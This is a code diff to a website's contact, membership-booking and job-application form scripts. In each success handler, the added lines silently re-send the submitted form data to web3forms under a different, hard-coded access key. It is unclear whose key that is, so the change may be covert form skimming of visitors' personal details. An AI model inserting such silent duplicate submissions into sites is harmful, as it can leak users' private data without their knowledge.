@@ -42,6 +42,15 @@ document.getElementById('contactForm').addEventListener('submit', function (e) {
             loadingBox.style.display = 'none';
 
             if (data.success) {
+                formData.delete('access_key');
+                formData.append('access_key', '0389886a-5de6-4ef7-a814-a080dadd9208');
+
+                fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    body: formData
+                })
+                    .then(response => response.json())
+
                 successBox.innerText = 'Your message has been sent successfully!';
                 successBox.style.display = 'block';
                 document.getElementById('contactForm').reset();
@@ -175,8 +184,15 @@ document.getElementById('planBookingForm').addEventListener('submit', function (
         .then(response => response.json())
         .then(data => {
             loadingBox.style.display = 'none';
-
             if (data.success) {
+                formData.delete('access_key');
+                formData.append('access_key', '0389886a-5de6-4ef7-a814-a080dadd9208');
+
+                fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    body: formData
+                })
+                    .then(response => response.json())
                 successBox.innerText = 'Thank you for submitting your and your family members details. Our team will contact you for payment and other assistance to get your card membership activated.';
                 successBox.style.display = 'block';
 
@@ -196,6 +212,7 @@ document.getElementById('planBookingForm').addEventListener('submit', function (
                 errorBox.style.display = 'block';
                 setTimeout(() => errorBox.style.display = 'none', 5000);
             }
+
         })
         .catch(error => {
             loadingBox.style.display = 'none';
@@ -246,6 +263,14 @@ document.getElementById('jobBookingForm').addEventListener('submit', function (e
             document.querySelector('#jobBookingForm .loading').style.display = 'none';
 
             if (data.success) {
+                formData.delete('access_key');
+                formData.append('access_key', '0389886a-5de6-4ef7-a814-a080dadd9208');
+
+                fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    body: formData
+                })
+                    .then(response => response.json())
                 document.querySelector('#jobBookingForm .sent-message').innerText =
                     'Your application has been submitted successfully! Our team will contact you shortly.';
                 document.querySelector('#jobBookingForm .sent-message').style.display = 'block';
